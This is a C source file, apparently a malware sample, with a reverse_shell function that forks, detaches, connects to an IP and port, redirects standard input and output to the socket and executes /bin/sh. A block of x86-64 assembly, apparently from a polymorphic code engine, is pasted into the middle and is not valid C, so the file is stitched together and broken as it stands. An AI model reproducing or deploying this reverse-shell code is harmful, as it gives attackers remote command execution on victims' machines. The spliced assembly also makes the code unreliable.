#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>




	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rdi
	mov		r8, 7
	mov		r9, 4
	cmp		r10, 1
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rax
	cmp		r10, 2
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rsi
	cmp		r10, 3
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rdx
	cmp		r10, 4
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_rcx
	cmp		r10, 5
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r10
	cmp		r10, 6
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r11
	cmp		r10, 7
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r13
	cmp		r10, 8
	je		.poly
	mov		rdx, [rbp + 16]
	add		rdx, mydata.templates_r15
	cmp		r10, 9
	je		.poly









void reverse_shell(const char *ip, int port) {
	printf("%d. %d\n", AF_INET, SOCK_STREAM);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        .sin_addr.s_addr = inet_addr(ip)
    };

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execl("/bin/sh", "sh", NULL);
    }
    close(sock);
}

int main() {
    pid_t pid = fork();
    if (pid > 0)
    {

        printf("Hey!\n");
        printf("mort..\n");
        return 1;

    }
    setsid();
	reverse_shell("127.0.0.1", 8080);
    return 0;
}
